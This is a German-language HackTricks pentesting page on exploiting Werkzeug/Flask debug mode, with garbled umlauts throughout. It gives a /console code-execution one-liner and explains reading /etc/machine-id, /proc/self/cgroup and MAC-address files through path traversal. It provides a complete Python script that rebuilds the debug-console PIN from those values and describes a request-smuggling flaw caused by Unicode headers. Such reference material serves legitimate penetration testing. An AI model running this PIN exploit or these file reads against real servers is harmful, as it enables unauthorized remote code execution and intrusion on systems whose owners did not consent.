# Werkzeug / Flask Debug

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Sofort verf√ºgbarer Setup f√ºr Schwachstellenbewertung & Penetrationstests**. F√ºhre einen vollst√§ndigen Pentest von √ºberall mit 20+ Tools & Funktionen durch, die von Recon bis Reporting reichen. Wir ersetzen keine Pentester - wir entwickeln ma√ügeschneiderte Tools, Erkennungs- & Ausnutzungs-Module, um ihnen etwas Zeit zur√ºckzugeben, um tiefer zu graben, Shells zu √∂ffnen und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Wenn der Debug-Modus aktiv ist, k√∂nntest du versuchen, auf `/console` zuzugreifen und RCE zu erlangen.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Es gibt auch mehrere Exploits im Internet wie [diesen ](https://github.com/its-arun/Werkzeug-Debug-RCE) oder einen in Metasploit.

## Pin Gesch√ºtzt - Path Traversal

In einigen F√§llen wird der **`/console`** Endpunkt durch einen Pin gesch√ºtzt. Wenn Sie eine **Dateitraversal-Sicherheitsanf√§lligkeit** haben, k√∂nnen Sie alle notwendigen Informationen leaken, um diesen Pin zu generieren.

### Werkzeug Console PIN Exploit

Erzwingen Sie eine Debug-Fehlerseite in der App, um dies zu sehen:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Eine Nachricht bez√ºglich des Szenarios "Konsole gesperrt" wird angezeigt, wenn versucht wird, auf die Debug-Schnittstelle von Werkzeug zuzugreifen, was auf die Notwendigkeit eines PINs hinweist, um die Konsole zu entsperren. Es wird vorgeschlagen, den Konsolen-PIN auszunutzen, indem der PIN-Generierungsalgorithmus in der Debug-Initialisierungsdatei von Werkzeug (`__init__.py`) analysiert wird. Der Mechanismus zur PIN-Generierung kann im [**Werkzeug-Quellcode-Repository**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) studiert werden, es wird jedoch geraten, den tats√§chlichen Servercode √ºber eine Dateitraversal-Sicherheitsanf√§lligkeit zu beschaffen, um m√∂gliche Versionsunterschiede zu vermeiden.

Um den Konsolen-PIN auszunutzen, werden zwei Variablen-Sets ben√∂tigt: `probably_public_bits` und `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Bezieht sich auf den Benutzer, der die Flask-Sitzung initiiert hat.
* **`modname`**: Typischerweise als `flask.app` bezeichnet.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Resolviert in der Regel zu **Flask**.
* **`getattr(mod, '__file__', None)`**: Stellt den vollst√§ndigen Pfad zu `app.py` im Flask-Verzeichnis dar (z. B. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Wenn `app.py` nicht zutrifft, **versuchen Sie `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Ruft die MAC-Adresse des aktuellen Ger√§ts ab, wobei `str(uuid.getnode())` sie in ein dezimales Format √ºbersetzt.
* Um **die MAC-Adresse des Servers zu bestimmen**, muss die aktive Netzwerkschnittstelle identifiziert werden, die von der App verwendet wird (z. B. `ens3`). Bei Unsicherheiten **leaken Sie `/proc/net/arp`**, um die Ger√§te-ID zu finden, und extrahieren Sie dann **die MAC-Adresse** aus **`/sys/class/net/<device id>/address`**.
*   Die Umwandlung einer hexadezimalen MAC-Adresse in dezimal kann wie folgt durchgef√ºhrt werden:

```python
# Beispiel MAC-Adresse: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: Verkn√ºpft Daten aus `/etc/machine-id` oder `/proc/sys/kernel/random/boot_id` mit der ersten Zeile von `/proc/self/cgroup` nach dem letzten Schr√§gstrich (`/`).

<details>

<summary>Code f√ºr `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Nachdem alle notwendigen Daten gesammelt wurden, kann das Exploit-Skript ausgef√ºhrt werden, um die Werkzeug-Konsole-PIN zu generieren:

Nachdem alle notwendigen Daten gesammelt wurden, kann das Exploit-Skript ausgef√ºhrt werden, um die Werkzeug-Konsole-PIN zu generieren. Das Skript verwendet die zusammengestellten `probably_public_bits` und `private_bits`, um einen Hash zu erstellen, der dann weiterverarbeitet wird, um die endg√ºltige PIN zu erzeugen. Unten steht der Python-Code zur Ausf√ºhrung dieses Prozesses:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Dieses Skript erzeugt die PIN, indem es die verketteten Bits hasht, spezifische Salze (`cookiesalt` und `pinsalt`) hinzuf√ºgt und die Ausgabe formatiert. Es ist wichtig zu beachten, dass die tats√§chlichen Werte f√ºr `probably_public_bits` und `private_bits` genau vom Zielsystem abgerufen werden m√ºssen, um sicherzustellen, dass die generierte PIN mit der von der Werkzeug-Konsole erwarteten √ºbereinstimmt.

{% hint style="success" %}
Wenn Sie eine **alte Version** von Werkzeug verwenden, versuchen Sie, den **Hash-Algorithmus auf md5** anstelle von sha1 zu √§ndern.
{% endhint %}

## Werkzeug Unicode-Zeichen

Wie in [**diesem Problem**](https://github.com/pallets/werkzeug/issues/2833) beobachtet, schlie√üt Werkzeug eine Anfrage mit Unicode-Zeichen in den Headern nicht. Und wie in [**diesem Bericht**](https://mizu.re/post/twisty-python) erkl√§rt, kann dies eine CL.0 Request Smuggling-Schwachstelle verursachen.

Das liegt daran, dass es in Werkzeug m√∂glich ist, einige **Unicode**-Zeichen zu senden, was den Server **zum Absturz bringen** kann. Wenn jedoch die HTTP-Verbindung mit dem Header **`Connection: keep-alive`** erstellt wurde, wird der Body der Anfrage nicht gelesen und die Verbindung bleibt weiterhin offen, sodass der **Body** der Anfrage als **n√§chste HTTP-Anfrage** behandelt wird.

## Automatisierte Ausnutzung

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Referenzen

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Sofort verf√ºgbare Einrichtung f√ºr Schwachstellenbewertung & Penetrationstests**. F√ºhren Sie einen vollst√§ndigen Pentest von √ºberall mit √ºber 20 Tools und Funktionen durch, die von Recon bis Reporting reichen. Wir ersetzen keine Pentester - wir entwickeln ma√ügeschneiderte Tools, Erkennungs- & Ausnutzungs-Module, um ihnen etwas Zeit zur√ºckzugeben, um tiefer zu graben, Shells zu √∂ffnen und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
